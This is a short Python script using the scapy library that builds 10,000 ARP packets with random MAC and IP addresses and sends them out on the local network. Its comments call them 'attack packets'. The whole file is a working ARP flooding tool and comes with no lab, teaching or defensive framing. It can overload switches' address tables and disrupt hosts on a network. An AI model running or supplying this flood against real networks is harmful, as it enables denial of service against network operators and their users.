from scapy.all import *
from random import randint
from random import choice

#l=random.choice('0123456789abcdef')
#m=RandMAC()

#start a list holding the attack packets
strike=[]
#generate 10000 packets
for pktNum in range(0,10000):
#get randomized MACs and IPs and create a packet
	ARP_Strike=Ether(dst=RandMAC(),src=RandMAC())/ARP(hwsrc=RandMAC(),hwdst=RandMAC(), pdst=RandIP(), psrc=RandIP())
#append packet to the list
	strike.append(ARP_Strike)
sendp(strike)
